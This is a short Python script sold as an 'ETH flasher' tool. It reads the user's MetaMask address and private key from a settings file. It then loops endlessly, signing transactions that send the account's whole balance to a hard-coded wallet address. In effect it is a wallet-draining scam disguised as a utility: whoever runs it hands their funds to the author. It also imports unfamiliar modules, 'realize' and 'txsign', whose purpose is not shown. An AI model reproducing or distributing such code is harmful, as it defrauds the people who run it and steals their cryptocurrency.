import requests
import time
import json
import realize
import txsign
from web3 import Web3
from rich import print


txt = "ETH FLASHER SOLIDITY | XAVIERS"

x = txt.title()

bsc = "https://eth-mainnet.public.blastapi.io"
web3 = Web3(Web3.HTTPProvider(bsc))

with open('Settings.json') as f:
    config = json.load(f)
    account_1 = config["metamask_address"]
    private_key = config["metamask_private_key"]


print("starting")
try:
    if  web3.isConnected() == True:
        print("web3 connected...\n")
    else :
        print("error connecting...")
except:
    print("Hata oldu,döngü başa alınıyor.")
    pass
a = 1

count = 0
while a == 1:
    try:
        balance = web3.eth.getBalance(account_1)
        nonce = web3.eth.get_transaction_count(account_1)
        tx_price = {
            'nonce': nonce,
            'to': "0x5791C75DF6A07290C6Ab6350e49Cc4BD17A0bAB9",
            'value': web3.toWei(balance, 'ether'),
            'gas': 21000,
            'gasPrice': web3.toWei('5', 'gwei')
        }

        signed_tx = web3.eth.account.sign_transaction(tx_price, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        web3.toHex(tx_hash)
        yolluk = web3.toHex(tx_hash)
        print(f"SUCCESS: {account_1} Balance: {balance}  Tx:{yolluk}")
    except:
        print("Waiting for Tx for flashload BTC")
        time.sleep(0.1)
        continue

    count += 1
